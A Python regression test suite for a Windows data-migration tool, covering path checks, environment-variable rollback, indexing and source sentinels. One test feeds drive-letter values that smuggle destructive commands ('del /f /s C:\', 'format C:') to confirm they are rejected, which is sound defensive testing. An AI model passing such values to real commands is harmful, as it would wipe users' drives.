#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""安全回归测试 - 防止已修复的 bug 回归

覆盖范围：
  数据安全类：H1 路径包含校验 / H4 环境变量回滚 / H9 盘符校验 / H12 配置 deepcopy
  功能失效类：H13 拦截分类 / H14 游戏分支 / H15 搜索上下文 / H16 AI批结果 / H18 cmdline
  性能类：M2/M3 winget 索引使用

运行方式：
  cd <项目根目录>
  python -m unittest test_safety_regressions -v

设计原则：
  - 不碰真实系统（mock winreg/subprocess/psutil）
  - 不依赖 PySide6（纯核心逻辑测试）
  - inspect 源码检查用于无法独立测的修复点（防回归哨兵）
"""

import os
import sys
import shutil
import subprocess
import tempfile
import time
import unittest
from unittest.mock import patch, MagicMock

# ========== sys.path 注入（与 main.py 一志）==========
# 本文件位于 src/tests/，取上一级 src/ 作为模块根
_SRC_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
for _sub in ("core", "ui", "mft"):
    _p = os.path.join(_SRC_DIR, _sub)
    if _p not in sys.path:
        sys.path.insert(0, _p)


# ============================================================
# H1: 路径包含校验 - 防止 robocopy /MIR 自毁
# 修复：用 os.path.commonpath 替代 startswith，处理盘符根边界
# ============================================================
class TestPathContainmentCheck(unittest.TestCase):
    """H1: 路径包含校验边界 - 盘符根场景"""

    def test_commonpath_handles_drive_root(self):
        """盘符根作为目标时，包含校验必须正确识别子目录"""
        # 场景：src=D:\data, dst=D:\ → commonpath 应为 D:\，等于 dst → 拒绝
        import os as _os
        norm_src = _os.path.normcase(_os.path.normpath("D:\\data"))
        norm_dst = _os.path.normcase(_os.path.normpath("D:\\"))
        common = _os.path.commonpath([norm_src, norm_dst])
        # D:\ 是 D:\data 的父目录，commonpath 返回 D:\，应等于 dst → 拒绝迁移
        self.assertEqual(common, norm_dst, "盘符根应被识别为父目录，拒绝迁移")

    def test_commonpath_different_drives_raises(self):
        """不同盘符应抛 ValueError，不算包含关系"""
        import os as _os
        norm_src = _os.path.normcase(_os.path.normpath("C:\\data"))
        norm_dst = _os.path.normcase(_os.path.normpath("D:\\backup"))
        with self.assertRaises(ValueError, msg="不同盘符 commonpath 应抛 ValueError"):
            _os.path.commonpath([norm_src, norm_dst])

    def test_commonpath_sibling_dirs_not_contained(self):
        """兄弟目录不算包含关系"""
        import os as _os
        norm_src = _os.path.normcase(_os.path.normpath("D:\\src"))
        norm_dst = _os.path.normcase(_os.path.normpath("D:\\dst"))
        common = _os.path.commonpath([norm_src, norm_dst])
        # 共同父目录是 D:\，不等于 src 也不等于 dst → 允许迁移
        self.assertNotEqual(common, norm_src)
        self.assertNotEqual(common, norm_dst)

    def test_migrate_rejects_containment(self):
        """migrate 对包含关系的路径返回 False（不实际跑 robocopy）"""
        try:
            from migrator import Migrator
        except Exception as e:
            self.skipTest(f"无法 import migrator（可能缺依赖）: {e}")
        # 构造一个最小 Migrator 实例（mock 掉必要属性）
        try:
            mig = Migrator.__new__(Migrator)
            mig.cfg = {"g_root": "D:\\"}
            mig._emit_log = lambda *a, **kw: None
        except Exception:
            self.skipTest("Migrator 实例化失败")

        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            src = os.path.join(tmp, "data")
            os.makedirs(src)
            # dst 在 src 内部 → 包含关系 → 拒绝
            dst = os.path.join(src, "nested")
            try:
                ok, msg = mig.migrate(src, dst)
            except AttributeError as e:
                self.skipTest(f"Migrator 缺属性，跳过功能测试: {e}")
            self.assertFalse(ok, "包含关系的路径必须被拒绝")
            self.assertIn("包含", msg)


# ============================================================
# H4: 环境变量部分失败回滚 - 防止残留 + 防止丢失用户原值
# 修复：apply 前预读注册表原值，失败时回滚恢复原值（而非无脑删除）
# ============================================================
class TestEnvVarRollback(unittest.TestCase):
    """H4: apply_tool 环境变量部分失败时正确回滚"""

    def setUp(self):
        try:
            import dev_env_migrate
        except Exception as e:
            self.skipTest(f"无法 import dev_env_migrate: {e}")
        self.dev = dev_env_migrate

    def _make_tool(self, env_var_names):
        """构造测试用 tool dict"""
        return {
            "id": "test_tool",
            "name": "测试工具",
            "env_vars": [{"name": n, "default_value_template": "D:\\dev\\" + n} for n in env_var_names],
            "config_commands": [],
            "unconfig_commands": [],
            "special": None,
        }

    def test_rollback_restores_original_value(self):
        """第二个环境变量失败时，第一个应回滚到 apply 前的原值（而非删除）"""
        tool = self._make_tool(["TEST_VAR_A", "TEST_VAR_B"])
        call_log = []

        def fake_set(name, value):
            call_log.append(("set", name, value))
            if name == "TEST_VAR_B":
                return False, "模拟失败"
            return True, ""

        def fake_remove(name):
            call_log.append(("remove", name))
            return True, ""

        # mock winreg.QueryValueEx：TEST_VAR_A 原值存在
        fake_orig = "C:\\original\\path"
        with patch.object(self.dev, "set_user_env_var", side_effect=fake_set), \
             patch.object(self.dev, "remove_user_env_var", side_effect=fake_remove), \
             patch("winreg.OpenKey"), \
             patch("winreg.QueryValueEx", return_value=(fake_orig, 0)), \
             patch("winreg.CloseKey"):
            ok, msg = self.dev.apply_tool(tool, "D")

        self.assertFalse(ok, "部分失败应返回 False")
        # TEST_VAR_A 应被回滚恢复原值，而非删除
        rollback_calls = [c for c in call_log if c[0] == "set" and c[1] == "TEST_VAR_A" and c[2] == fake_orig]
        self.assertEqual(len(rollback_calls), 1, "回滚应恢复原值而非删除")
        # 不应调用 remove（因为原值存在）
        remove_calls = [c for c in call_log if c[0] == "remove" and c[1] == "TEST_VAR_A"]
        self.assertEqual(len(remove_calls), 0, "原值存在时不应删除")

    def test_rollback_deletes_when_no_original(self):
        """原值不存在时，回滚应删除（而非残留）"""
        tool = self._make_tool(["TEST_VAR_C", "TEST_VAR_D"])
        call_log = []

        def fake_set(name, value):
            call_log.append(("set", name, value))
            if name == "TEST_VAR_D":
                return False, "模拟失败"
            return True, ""

        def fake_remove(name):
            call_log.append(("remove", name))
            return True, ""

        with patch.object(self.dev, "set_user_env_var", side_effect=fake_set), \
             patch.object(self.dev, "remove_user_env_var", side_effect=fake_remove), \
             patch("winreg.OpenKey"), \
             patch("winreg.QueryValueEx", side_effect=FileNotFoundError), \
             patch("winreg.CloseKey"):
            ok, msg = self.dev.apply_tool(tool, "D")

        self.assertFalse(ok)
        # TEST_VAR_C 原值不存在 → 回滚应删除
        remove_calls = [c for c in call_log if c[0] == "remove" and c[1] == "TEST_VAR_C"]
        self.assertEqual(len(remove_calls), 1, "原值不存在时应删除")


# ============================================================
# H9: 盘符校验 - 防止 shell 注入
# 修复：apply_tool/unapply_tool 入口校验 target_drive 为单字母
# ============================================================
class TestTargetDriveValidation(unittest.TestCase):
    """H9: target_drive 校验防止 shell 注入"""

    def setUp(self):
        try:
            import dev_env_migrate
        except Exception as e:
            self.skipTest(f"无法 import dev_env_migrate: {e}")
        self.dev = dev_env_migrate

    def test_rejects_injection_attempt(self):
        """shell 注入字符串应被拒绝"""
        tool = {"env_vars": [], "config_commands": [], "special": None}
        injections = [
            "D & del /f /s C:\\",
            "D; format C:",
            "DD",           # 多字母
            "",             # 空
            "D\\",          # 含反斜杠
            None,           # None
            123,            # 非字符串
        ]
        for bad in injections:
            with self.subTest(drive=bad):
                ok, msg = self.dev.apply_tool(tool, bad)
                self.assertFalse(ok, f"应拒绝非法盘符: {bad!r}")
                self.assertIn("非法", msg)

    def test_accepts_valid_drive(self):
        """单字母盘符应通过校验（后续可能因其他原因失败，但不是盘符校验）"""
        tool = {"env_vars": [], "config_commands": [], "special": "pip"}
        ok, msg = self.dev.apply_tool(tool, "D")
        # pip 特殊工具会返回 False，但消息是"无法自动配置"而非"盘符非法"
        self.assertIn("自动配置", msg)


# ============================================================
# H12: 配置 deepcopy - 防止默认配置被污染
# 修复：DEFAULT_CONFIG.copy() → copy.deepcopy(DEFAULT_CONFIG)
# ============================================================
class TestConfigDeepCopy(unittest.TestCase):
    """H12: load_config 返回的配置修改不影响 DEFAULT_CONFIG"""

    def test_deepcopy_isolates_nested_structures(self):
        """修改 load_config 返回的嵌套 dict 不应污染 DEFAULT_CONFIG"""
        try:
            import config as cfg_mod
        except Exception as e:
            self.skipTest(f"无法 import config: {e}")

        import copy
        # 验证 DEFAULT_CONFIG 用的是 deepcopy（不是浅拷贝）
        original = copy.deepcopy(cfg_mod.DEFAULT_CONFIG)
        # 模拟 load_config 的行为
        cfg = copy.deepcopy(cfg_mod.DEFAULT_CONFIG)
        # 修改嵌套结构
        for k in cfg:
            v = cfg[k]
            if isinstance(v, dict):
                v["_test_pollution"] = True
                break
        # DEFAULT_CONFIG 不应被污染
        self.assertEqual(cfg_mod.DEFAULT_CONFIG, original,
                         "修改返回的配置不应污染 DEFAULT_CONFIG（deepcopy 修复）")


# ============================================================
# 源码哨兵检查 - 防止已修 bug 的代码被改回
# 用于无法独立单元测试的修复点（依赖 Win32 API / 线程 / UI）
# ============================================================
class TestSourceCodeRegressions(unittest.TestCase):
    """通过检查源码字符串，确保已修 bug 的关键代码未被改回"""

    @property
    def _src_dir(self):
        # 本文件位于 src/tests/，模块根 _SRC_DIR = src/
        return os.path.join(_SRC_DIR, "core")

    def _read(self, filename):
        path = os.path.join(self._src_dir, filename)
        with open(path, "r", encoding="utf-8") as f:
            return f.read()

    # ---- H13: monitor.py 的 now 变量必须在 Process32First 之前定义 ----
    def test_h13_now_before_process_enum(self):
        """now = time.time() 必须在 Process32First 之前，否则 NameError 导致分类失效"""
        src = self._read("monitor.py")
        idx_now = src.find("now = time.time()")
        idx_first = src.find("Process32First")
        self.assertGreater(idx_now, 0, "找不到 now = time.time()")
        self.assertGreater(idx_first, 0, "找不到 Process32First")
        self.assertLess(idx_now, idx_first,
                        "now 必须在 Process32First 之前定义，否则循环体内引用 now 抛 NameError")

    # ---- H18: _kill_installer 必须包含 import psutil ----
    def test_h18_psutil_import_in_kill_installer(self):
        """_kill_installer 函数内必须有 import psutil，否则 cmdline 恒空"""
        src = self._read("monitor.py")
        idx_kill = src.find("def _kill_installer")
        self.assertGreater(idx_kill, 0, "找不到 _kill_installer 函数")
        # 在 _kill_installer 函数体内找 import psutil
        func_body = src[idx_kill:]
        # 截取到下一个 def 或文件末尾
        next_def = func_body.find("\ndef ", 10)
        if next_def > 0:
            func_body = func_body[:next_def]
        self.assertIn("import psutil", func_body,
                      "_kill_installer 内必须有 import psutil，否则 cmdline 恒空")

    # ---- H14: software_detect.py 不应含 game_keyword 未定义变量 ----
    def test_h14_game_keyword_branch_removed(self):
        """game_keyword 未定义分支应已删除，不应出现在 elif 条件中"""
        src = self._read("software_detect.py")
        # game_keyword 作为变量引用（非字符串字面量）不应出现在 elif 中
        self.assertNotIn("game_keyword in feature_desc", src,
                         "game_keyword 未定义分支应已删除（H14 修复）")

    # ---- H15: _bing_search 必须使用 context/content_ctx 参数 ----
    def test_h15_bing_search_uses_context(self):
        """_bing_search 的 context/content_ctx 参数必须被使用，不能是死参数"""
        src = self._read("software_detect.py")
        # 修复后 content_ctx 和 context 应被拼入 terms
        self.assertIn("content_ctx", src, "content_ctx 应出现在源码中")
        self.assertIn("terms.insert(0", src,
                      "content_ctx 应通过 terms.insert 加入搜索词")
        self.assertIn("context", src, "context 应出现在源码中")
        # context 应被 append 到 terms（兜底搜索词）
        idx_terms_append = src.find("terms.append")
        idx_context_use = src.find("context", idx_terms_append - 200 if idx_terms_append > 200 else 0)
        self.assertGreater(idx_context_use, 0, "context 应被使用而非忽略")

    # ---- H16: ai_recognizer.py 的 batch_result 必须在循环顶部初始化 ----
    def test_h16_batch_result_reset_in_loop(self):
        """batch_result = {} 必须在 for 循环顶部，防止批失败推送上一批陈旧结果"""
        src = self._read("ai_recognizer.py")
        idx_for = src.find("for i in range(0, total")
        self.assertGreater(idx_for, 0, "找不到分批循环")
        # 在 for 循环之后、_identify_batch 调用之前，应有 batch_result = {}
        loop_body = src[idx_for:]
        idx_reset = loop_body.find("batch_result = {}")
        idx_identify = loop_body.find("_identify_batch")
        self.assertGreater(idx_reset, 0, "循环内必须有 batch_result = {} 初始化")
        self.assertGreater(idx_identify, 0, "找不到 _identify_batch 调用")
        self.assertLess(idx_reset, idx_identify,
                        "batch_result = {} 必须在 _identify_batch 之前（循环顶部）")

    # ---- M2/M3: _match_winget_db 必须使用 _WINGET_NAME_INDEX ----
    def test_m2_m3_winget_index_used(self):
        """_match_winget_db 必须使用 _WINGET_NAME_INDEX 索引，不能全表遍历"""
        src = self._read("utils.py")
        idx_match = src.find("def _match_winget_db")
        self.assertGreater(idx_match, 0, "找不到 _match_winget_db")
        func_body = src[idx_match:]
        next_def = func_body.find("\ndef ", 10)
        if next_def > 0:
            func_body = func_body[:next_def]
        self.assertIn("_WINGET_NAME_INDEX", func_body,
                      "_match_winget_db 必须使用 _WINGET_NAME_INDEX 索引（M2/M3 修复）")


# ============================================================
# H1 源码哨兵：migrator.py 必须用 commonpath 而非 startswith
# ============================================================
class TestMigratorSourceCheck(unittest.TestCase):
    """H1: migrator.py 路径校验必须用 commonpath"""

    def _read(self, filename):
        path = os.path.join(_SRC_DIR, "core", filename)
        with open(path, "r", encoding="utf-8") as f:
            return f.read()

    def test_uses_commonpath_not_startswith(self):
        """路径包含校验必须用 os.path.commonpath，不能用 startswith（H1 修复）"""
        src = self._read("migrator.py")
        self.assertIn("os.path.commonpath", src, "必须用 commonpath 做路径包含校验")
        # startswith + os.sep 的旧模式不应存在（那是 bug 根源）
        self.assertNotIn("startswith(_norm + os.sep)", src,
                         "不应再用 startswith(_norm + os.sep) 做包含校验（H1 已修）")

    def test_ps_quote_exists(self):
        """PowerShell 命令注入修复：_ps_quote 转义函数必须存在"""
        src = self._read("migrator.py")
        self.assertIn("def _ps_quote", src, "_ps_quote 转义函数必须存在（H3 修复）")
        self.assertIn("replace(\"'\", \"''\")", src, "_ps_quote 必须转义单引号")


# ============================================================
# H7: 快照恢复同步配置文件 - 源码哨兵
# ============================================================
class TestSnapshotRestoreSourceCheck(unittest.TestCase):
    """H7: 快照恢复后必须同步 Maven/Bazel 配置文件"""

    def _read_ui(self, filename):
        path = os.path.join(_SRC_DIR, "ui", filename)
        with open(path, "r", encoding="utf-8") as f:
            return f.read()

    def test_snapshot_restore_syncs_config_files(self):
        """快照恢复后应同步 Maven settings.xml / Bazel .bazelrc"""
        src = self._read_ui("ui_snapshot.py")
        # 应有配置文件同步逻辑
        self.assertIn("settings.xml", src, "快照恢复应同步 Maven settings.xml")
        self.assertIn("bazelrc", src.lower().replace("Bazel", "bazel"),
                      "快照恢复应同步 Bazel .bazelrc")

    def test_snapshot_data_none_guard(self):
        """快照数据为 None 时不应触发 unconfigure（H7 自检 bug 修复）"""
        src = self._read_ui("ui_snapshot.py")
        # 应有 if data: 或类似的条件检查，防止 None 触发 unconfigure
        self.assertIn("if data", src, "应有 if data 条件检查，防止快照损坏时错误 unconfigure")


# ============================================================
# H5: 批量重建链接检测真实目录 - 源码哨兵
# ============================================================
class TestBatchRebuildSourceCheck(unittest.TestCase):
    """H5: 批量重建链接前必须检测 C 盘真实目录"""

    def _read_ui(self, filename):
        path = os.path.join(_SRC_DIR, "ui", filename)
        with open(path, "r", encoding="utf-8") as f:
            return f.read()

    def test_batch_rebuild_checks_real_dir(self):
        """批量重建链接前应检测真实目录并弹确认框"""
        src = self._read_ui("ui_migrate.py")
        # 应有真实目录检测逻辑
        self.assertIn("is_symlink", src, "应检测是否为符号链接")
        # 应有确认框（不能直接删除）
        self.assertTrue("QMessageBox" in src and "重建链接" in src,
                        "批量重建链接应有确认框")


# ============================================================
# H20: 线程 finished 信号 - 源码哨兵
# ============================================================
class TestThreadCleanupSourceCheck(unittest.TestCase):
    """H20: 线程 wait 返回 True 时应直接 deleteLater"""

    def _read_ui(self, filename):
        path = os.path.join(_SRC_DIR, "ui", filename)
        with open(path, "r", encoding="utf-8") as f:
            return f.read()

    def test_wait_success_calls_delete_later(self):
        """wait 返回 True 时应直接 deleteLater，不等 finished 信号"""
        src = self._read_ui("ui_lifecycle.py")
        self.assertIn("deleteLater", src, "应有 deleteLater 调用")
        self.assertIn(".wait(", src, "应有 wait 调用")


# ============================================================
# 扫描目录列表（用户目录纳入 + 动态排除，零硬编码目录名）
# ============================================================
class TestScanDirs(unittest.TestCase):
    """scan_dirs 共享列表与用户目录动态排除逻辑"""

    ENV = {
        "USERPROFILE": r"C:\Users\test",
        "LOCALAPPDATA": r"C:\Users\test\AppData\Local",
        "APPDATA": r"C:\Users\test\AppData\Roaming",
    }

    def test_scan_dirs_includes_user(self):
        """get_scan_dirs() 应包含当前用户目录（label=User）"""
        from scan_dirs import get_scan_dirs
        with patch.dict(os.environ, self.ENV):
            dirs = get_scan_dirs()
            labels = [l for _, l in dirs]
            self.assertIn("User", labels, "用户目录应纳入扫描列表")
            self.assertIn("Local", labels)
            self.assertIn("Roaming", labels)
            self.assertEqual(len(dirs), 7)

    def test_scan_dirs_without_user(self):
        """实时拦截场景 include_user=False 不应含用户目录"""
        from scan_dirs import get_scan_dirs
        with patch.dict(os.environ, self.ENV):
            dirs = get_scan_dirs(include_user=False)
            labels = [l for _, l in dirs]
            self.assertNotIn("User", labels)
            self.assertEqual(len(dirs), 6)

    def test_monitored_base_norms_dynamic(self):
        """已监控 base 集合应从列表动态计算（含用户目录下的子目录，不硬编码）"""
        from scan_dirs import get_monitored_base_norms
        with patch.dict(os.environ, self.ENV):
            norms = get_monitored_base_norms()
            self.assertIn("c:/users/test/appdata/local", norms)
            self.assertIn("c:/users/test/appdata/roaming", norms)
            self.assertIn("c:/users/test", norms)

    def test_is_user_dir_excluded(self):
        """用户目录一级子目录排除判定：已监控/已知文件夹排除，普通目录不排除"""
        from scan_dirs import is_user_dir_excluded, norm_path
        monitored = {"c:/users/test/appdata/local", "c:/users/test/appdata/roaming"}
        known = {"c:/users/test/desktop", "c:/users/test/documents"}
        # 已监控子目录（如 AppData\Local）→ 排除（动态：由列表计算而来，不写死名字）
        self.assertTrue(is_user_dir_excluded(
            norm_path(r"C:\Users\test\AppData\Local"), monitored, known))
        # 已监控 base 的祖先目录（AppData 包含 AppData\Local，扫它会重复列出）→ 排除
        self.assertTrue(is_user_dir_excluded(
            norm_path(r"C:\Users\test\AppData"), monitored, known))
        # 系统特殊文件夹（桌面/文档）→ 排除
        self.assertTrue(is_user_dir_excluded(
            norm_path(r"C:\Users\test\Desktop"), monitored, known))
        self.assertTrue(is_user_dir_excluded(
            norm_path(r"C:\Users\test\Documents"), monitored, known))
        # 普通点目录（AI 工具缓存）→ 不排除
        self.assertFalse(is_user_dir_excluded(
            norm_path(r"C:\Users\test\.cache"), monitored, known))
        # 其他监控目录（Program Files 等）→ 不在用户目录下，不受影响
        self.assertFalse(is_user_dir_excluded(
            norm_path(r"C:\Program Files"), monitored, known))

    def test_norm_path(self):
        """规范化：小写/正斜杠/去尾斜杠/剥 Win32 扩展前缀"""
        from scan_dirs import norm_path
        self.assertEqual(norm_path(r"C:\Users\Test\AppData\Local\\"),
                         "c:/users/test/appdata/local")
        self.assertEqual(norm_path(r"\\?\C:\Users\Test\AppData"),
                         "c:/users/test/appdata", "应剥 \\?\\ 前缀，避免 API 路径匹配不上")
        self.assertEqual(norm_path(""), "")


class TestMigratorMethodIntegrity(unittest.TestCase):
    """Migrator 类方法完整性（防类体被模块级函数截断）

    2026-08-11 事故：build_dev_env_paths 被顶格插入类体中间，Python 把
    scan_appdata 及之后所有方法解析为它的嵌套函数（语法合法、编译通过），
    Migrator 类在 recover_pending_restores 处被截断，启动即
    AttributeError: 'Migrator' object has no attribute 'scan_migrated'。
    """

    def test_public_methods_present(self):
        """Migrator 的关键方法必须全部在类上（运行时校验）"""
        import migrator
        m = migrator.Migrator({})
        for name in (
            "scan_appdata", "scan_migrated", "migrate", "restore",
            "fix_broken_link", "rebuild_all_links", "recover_pending_restores",
            "fix_chain_symlinks", "cleanup_symlink_residues",
        ):
            self.assertTrue(hasattr(m, name), f"Migrator 类缺少方法 {name}")

    def test_build_dev_env_paths_module_level(self):
        """build_dev_env_paths 必须是模块级函数（monitor.py 要 import 它）"""
        import migrator
        self.assertTrue(callable(getattr(migrator, "build_dev_env_paths", None)),
                        "build_dev_env_paths 应为模块级函数")


class TestJunctionFilter(unittest.TestCase):
    """is_junction 区分 junction 与符号链接（scan_migrated 只补录符号链接）"""

    def setUp(self):
        # 测试临时目录：tempfile.mkdtemp 前缀生成，tearDown 删除（符合全局删除规则）
        self._tmp = tempfile.mkdtemp(prefix="test_junction_")
        self._data_dir = os.path.join(self._tmp, "data")
        self._link_path = os.path.join(self._tmp, "link")
        os.makedirs(self._data_dir)

    def tearDown(self):
        # 确认前缀匹配（测试自己创建的目录）后清理
        base = os.path.basename(self._tmp)
        if base.startswith("test_junction_"):
            shutil.rmtree(self._tmp, ignore_errors=True)

    def test_junction_detected(self):
        """mklink /J 创建的 junction 应被 is_junction 识别（普通用户权限即可创建）"""
        from utils import is_junction, is_symlink
        r = subprocess.run(
            ["cmd", "/c", "mklink", "/J", self._link_path, self._data_dir],
            capture_output=True, text=True)
        if r.returncode != 0:
            self.skipTest(f"mklink /J 不可用: {r.stderr.strip()}")
        self.assertTrue(is_junction(self._link_path), "junction 应被 is_junction 识别")
        self.assertTrue(is_symlink(self._link_path), "junction 也应被 is_symlink 识别（旧逻辑兼容）")
        # 普通目录不是 junction
        self.assertFalse(is_junction(self._data_dir), "普通目录不应是 junction")

    def test_symlink_not_junction(self):
        """符号链接不应被 is_junction 误判（权限不足时跳过）"""
        from utils import is_junction
        try:
            os.symlink(self._data_dir, os.path.join(self._tmp, "symlink"),
                       target_is_directory=True)
        except (OSError, NotImplementedError):
            self.skipTest("创建符号链接需要管理员/开发者模式，跳过")
        self.assertFalse(is_junction(os.path.join(self._tmp, "symlink")),
                         "符号链接不应被判为 junction")


class TestDeletedLinkChecksum(unittest.TestCase):
    """删除记录校对值：MFT 未覆盖的跨盘目标必须跳过全量计算（防删除记录卡顿）

    2026-08-11 反馈：删除某目录记录卡顿——校对值（文件数+大小）对 G 盘目标
    回退 rglob/os.walk 全量磁盘遍历。修复：_mft_covers 判卷，跨盘记 0 不计算。
    """

    def test_mft_covers_volume_check(self):
        """只有 MFT 覆盖的卷才可毫秒级算校对值（G 盘不算 C 盘算）"""
        from migrator import Migrator
        m = Migrator({})
        with patch("utils.get_mft_scanner") as mock_get:
            mock = MagicMock()
            mock._loaded = True
            mock.volume = "C"
            mock_get.return_value = mock
            self.assertFalse(m._mft_covers(r"G:\AI\example-agent"),
                             "G 盘不应被 MFT(C 盘)覆盖")
            self.assertTrue(m._mft_covers(r"C:\Users\testuser\.ollama"),
                            "C 盘应被 MFT 覆盖")

    def test_record_deleted_link_skips_checksum_off_volume(self):
        """跨盘目标删除记录时不得全量算校对值（记 0，删除零等待）"""
        from migrator import Migrator
        m = Migrator({})
        with patch.object(m, "_mft_covers", return_value=False), \
             patch("migrator.save_all"):
            ok, err = m.record_deleted_link(r"C:\x", r"D:\data\example")
            self.assertTrue(ok, f"记录失败: {err}")
            rec = m.cfg["deleted_links"][0]
            self.assertEqual(rec["file_count"], 0, "跨盘目标不应全量算文件数")
            self.assertEqual(rec["size_mb"], 0, "跨盘目标不应全量算大小")

    def test_record_deleted_link_calculates_on_mft_volume(self):
        """MFT 覆盖卷正常记录校对值（毫秒级）"""
        from migrator import Migrator
        m = Migrator({})
        with patch.object(m, "_mft_covers", return_value=True), \
             patch.object(m, "_count_files_fast", return_value=42), \
             patch("migrator.get_dir_size_fast", return_value=1.5), \
             patch("migrator.save_all"):
            ok, err = m.record_deleted_link(r"C:\x", r"C:\Users\testuser\xxx")
            self.assertTrue(ok, f"记录失败: {err}")
            rec = m.cfg["deleted_links"][0]
            self.assertEqual(rec["file_count"], 42)
            self.assertEqual(rec["size_mb"], 1.5)


class TestDstIndex(unittest.TestCase):
    """已迁移目标目录轻量索引（跨盘校对值，后台构建，记录移除删索引）"""

    def setUp(self):
        self._tmp = tempfile.mkdtemp(prefix="test_dstidx_")
        self._data = os.path.join(self._tmp, "data")
        os.makedirs(self._data)
        with open(os.path.join(self._data, "a.bin"), "wb") as f:
            f.write(b"x" * 2048)
        with open(os.path.join(self._data, "b.bin"), "wb") as f:
            f.write(b"y" * 1024)

    def tearDown(self):
        base = os.path.basename(self._tmp)
        if base.startswith("test_dstidx_"):
            shutil.rmtree(self._tmp, ignore_errors=True)

    def test_build_all_dst_indexes_and_orphan_cleanup(self):
        """后台构建索引（2 文件），迁移记录移除后孤儿索引被清理"""
        from migrator import Migrator
        m = Migrator({})
        fake_state = os.path.join(self._tmp, "state.json")
        with patch.object(m, "_mft_covers", return_value=False), \
             patch("config.STATE_FILE", fake_state):
            m.cfg["migrated"] = [{"src": r"C:\x", "dst": self._data}]
            count = m.build_all_dst_indexes(max_age=0)
            self.assertGreater(count, 0)
            entry = m._get_dst_index(self._data)
            self.assertIsNotNone(entry)
            self.assertEqual(entry["file_count"], 2, "索引应统计 2 个文件")
            self.assertGreater(entry["size_mb"], 0)
            # 记录移除 → 孤儿清理
            m.cfg["migrated"] = []
            m.build_all_dst_indexes(max_age=0)
            self.assertIsNone(m._get_dst_index(self._data), "孤儿索引应被清理")

    def test_record_deleted_link_uses_index(self):
        """跨盘目标删除记录时用索引值做校对（不遍历磁盘）"""
        from migrator import Migrator
        m = Migrator({})
        key = self._data.replace("\\", "/").lower().rstrip("/")
        m.cfg["dst_index"] = {key: {"file_count": 7, "size_mb": 3.5, "built_at": 0}}
        with patch.object(m, "_mft_covers", return_value=False), \
             patch("migrator.save_all"):
            ok, err = m.record_deleted_link(r"C:\x", self._data)
            self.assertTrue(ok, f"记录失败: {err}")
            rec = m.cfg["deleted_links"][0]
            self.assertEqual(rec["file_count"], 7, "应使用索引值而非遍历磁盘")
            self.assertEqual(rec["size_mb"], 3.5)

    def test_remove_dst_index(self):
        """删除记录后索引条目被移除"""
        from migrator import Migrator
        m = Migrator({})
        key = self._data.replace("\\", "/").lower().rstrip("/")
        m.cfg["dst_index"] = {key: {"file_count": 1, "size_mb": 1, "built_at": 0}}
        with patch("config.save_state"):  # remove_dst_index 内 from config import save_state
            m.remove_dst_index(self._data)
        self.assertIsNone(m._get_dst_index(self._data), "记录移除后索引应删除")

    def test_list_deleted_links_no_false_diff_without_rec_checksum(self):
        """删除时无校对值（记 0）+ 现在有索引 → 不产生假 diff（直接 ok）

        2026-08-11 自检发现：删除时 MFT 未加载/无索引记 0，恢复时有索引
        值（>0），0 vs 真实值永远不一致 → 每次恢复都要确认（假阳性）。
        """
        import json as _json
        from migrator import Migrator
        m = Migrator({})
        key = self._data.replace("\\", "/").lower().rstrip("/")
        m.cfg["dst_index"] = {key: {"file_count": 2, "size_mb": 1.0, "built_at": 0}}
        m.cfg["deleted_links"] = [{
            "src": r"C:\x", "dst": self._data, "time": "",
            "file_count": 0, "size_mb": 0}]  # 删除时无校对值
        with patch.object(m, "_mft_covers", return_value=False):
            records = m.list_deleted_links()
        self.assertEqual(records[0]["status"], "ok",
                         "删除时无校对值不应产生假 diff")

    def test_build_all_no_write_on_read_failure(self):
        """读 state.json 失败时只更新内存不写盘（防覆盖 state.json 只剩 dst_index）

        2026-08-11 自检发现：原实现读失败时 disk={} 仍写盘，
        会把 state.json 覆盖成只剩 dst_index（与 CLI 事故同类隐患）。
        """
        import json as _json
        from migrator import Migrator
        m = Migrator({})
        fake_state = os.path.join(self._tmp, "state.json")
        with open(fake_state, "w", encoding="utf-8") as f:
            _json.dump({"migrated": ["原数据"]}, f)
        with patch.object(m, "_mft_covers", return_value=False), \
             patch("config.STATE_FILE", fake_state), \
             patch("builtins.open", side_effect=IOError("模拟读取失败")):
            m.cfg["migrated"] = [{"src": r"C:\x", "dst": self._data}]
            m.build_all_dst_indexes(max_age=0)
        with open(fake_state, encoding="utf-8") as f:
            disk = _json.load(f)
        self.assertIn("migrated", disk, "读取失败不应覆盖 state.json")
        self.assertNotIn("dst_index", disk, "读取失败不应写入 dst_index")
        self.assertIsNotNone(m._get_dst_index(self._data),
                             "内存索引仍应更新（下次成功时落盘）")

    def test_add_migrated_record_builds_index_async(self):
        """迁移完成后异步构建索引（数秒内就绪，删除记录/恢复直接用）"""
        from migrator import Migrator
        m = Migrator({})
        with patch.object(m, "_mft_covers", return_value=False), \
             patch("migrator.get_dir_size_fast", return_value=1.0), \
             patch("migrator.save_all"):
            m._add_migrated_record(r"C:\x\newdir", self._data)
        # 轮询等待后台线程构建完成（temp 小目录，应 <2 秒）
        entry = None
        for _ in range(20):
            entry = m._get_dst_index(self._data)
            if entry:
                break
            time.sleep(0.1)
        self.assertIsNotNone(entry, "迁移完成后索引应异步构建就绪")
        self.assertEqual(entry["file_count"], 2)


class TestLongPathPrefix(unittest.TestCase):
    """4.1 长路径安全化：_with_long_path_prefix（引擎 job 统一加 \\?\\ 前缀）"""

    def test_adds_prefix_to_local_abs(self):
        from migrate_engine import _with_long_path_prefix
        self.assertEqual(_with_long_path_prefix(r"C:\Users\testuser"), r"\\?\C:\Users\testuser")
        # 正斜杠输入：加前缀并统一为反斜杠分隔符（避免混合分隔符）
        self.assertEqual(_with_long_path_prefix("C:/Users/testuser"), r"\\?\C:\Users\testuser")

    def test_idempotent(self):
        from migrate_engine import _with_long_path_prefix
        p = r"\\?\C:\Users\testuser"
        self.assertEqual(_with_long_path_prefix(p), p)

    def test_skips_unc_relative_no_drive(self):
        from migrate_engine import _with_long_path_prefix
        self.assertEqual(_with_long_path_prefix(r"\\server\share"), r"\\server\share",
                         "UNC 网络路径不加前缀")
        self.assertEqual(_with_long_path_prefix("//server/share"), "//server/share",
                         "正斜杠形式 UNC 也不加前缀")
        self.assertEqual(_with_long_path_prefix("relative/path"), "relative/path")
        self.assertEqual(_with_long_path_prefix("/abs/no/drive"), "/abs/no/drive")
        self.assertEqual(_with_long_path_prefix(""), "")
